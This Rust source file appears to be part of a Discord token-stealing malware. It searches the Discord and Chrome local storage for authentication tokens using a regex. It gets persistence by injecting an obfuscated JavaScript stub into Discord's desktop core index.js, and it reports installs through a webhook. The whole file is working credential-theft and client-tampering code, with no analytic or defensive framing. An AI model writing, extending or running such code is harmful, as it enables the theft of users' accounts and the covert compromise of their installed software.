use crate::network;
use dirs;
use regex::Regex;
use std::fs;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::path::PathBuf;

pub fn get_paths() -> Vec<PathBuf> {
    let app_data = dirs::config_dir();

    if app_data.is_none() {
        return Vec::new();
    }

    let app_data = app_data.unwrap();

    const POSSIBLE_FOLDERS: [&'static str; 4] =
        ["Discord", "discordcanary", "discordptb", "Google"];

    let mut paths: Vec<PathBuf> = Vec::new();

    for folder in POSSIBLE_FOLDERS.iter() {
        if folder == &"Google" {
            let new_path = app_data
                .join(folder)
                .join("Chrome")
                .join("User Data")
                .join("Default")
                .join("Local Storage")
                .join("leveldb");
            if !new_path.exists() || !new_path.is_dir() {
                continue;
            }

            paths.push(new_path)
        } else {
            let new_path = app_data.join(folder).join("Local Storage").join("leveldb");
            if !new_path.exists() || !new_path.is_dir() {
                continue;
            }

            paths.push(new_path);
        }
    }

    paths
}

fn get_persistence_paths() -> Vec<PathBuf> {
    let app_data = dirs::config_dir();

    if app_data.is_none() {
        return Vec::new();
    }

    let app_data = app_data.unwrap();

    const POSSIBLE_FOLDERS: [&'static str; 3] = ["Discord", "discordcanary", "discordptb"];

    let mut paths: Vec<PathBuf> = Vec::new();

    let folder_regex = Regex::new(r#"(^\d\.\d\.\d{3}$)"#).unwrap();
    for folder in POSSIBLE_FOLDERS.iter() {
        let new_path = app_data.join(folder);

        if !new_path.exists() || !new_path.is_dir() {
            continue;
        }

        let versions = fs::read_dir(&new_path).unwrap();
        for version in versions {
            let version_str = version.unwrap().file_name();
            let version_str = version_str.to_str().unwrap();
            let is_match = folder_regex.is_match(version_str);
            if is_match {
                let new_path_cpy = &new_path
                    .join(version_str)
                    .join("modules")
                    .join("discord_desktop_core");
                if !new_path_cpy.exists() || !new_path_cpy.is_dir() {
                    continue;
                }

                paths.push(new_path_cpy.to_path_buf());
            }
        }
    }
    paths
}

pub fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String> {
    let raw_bytes = fs::read(file).unwrap();
    let text = String::from_utf8_lossy(&raw_bytes);
    let caps = token_regex.captures(&text);
    if let Some(caps) = caps {
        return Some(caps.get(0).unwrap().as_str().to_string());
    } else {
        return None;
    }
}

pub fn inject_persistence() {
    let to_dump: String = include!("../stub_obf.js").to_string();

    let persistence_paths = get_persistence_paths();
    for persist_loc in persistence_paths {
        let index_file = persist_loc.join("index.js");
        if !index_file.exists() {
            continue;
        }

        let mut file_handle = OpenOptions::new()
            .read(true)
            .write(true)
            .open(&index_file)
            .expect("failed to open file");

        let mut file_data = String::new();
        file_handle
            .read_to_string(&mut file_data)
            .expect("unable to read file");

        if file_data.chars().count() > 500 {
            return; //already installed persist - ghetto way
        }
        file_handle
            .write_all(format!("\n{}", to_dump).as_bytes())
            .expect("unable to write to file");
        network::send_webhook_message(&format!(
            "installed persistence to {}",
            index_file.display()
        ));
    }
}

pub fn get_discord_token() -> String {
    let paths_to_check = get_paths();
    if paths_to_check.len() == 0 {
        return String::from("error: no paths to check");
    }

    let token_regex: Regex = Regex::new(
        r#"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})"#,
    )
    .unwrap();

    let mut final_tokens = String::new();
    for path in paths_to_check {
        for entry in fs::read_dir(path).unwrap() {
            if let Ok(entry) = entry {
                let entry_as_path = entry.path();
                let entry_extension = entry_as_path.extension();
                if let Some(ext) = entry_extension {
                    if ext == "ldb" {
                        //apply regex here
                        let result = get_token_from_file(&token_regex, &entry_as_path);
                        if let Some(token) = result {
                            final_tokens = format!("{} | `{}`", final_tokens, token);
                        }
                    }
                }
            }
        }
    }
    final_tokens
}
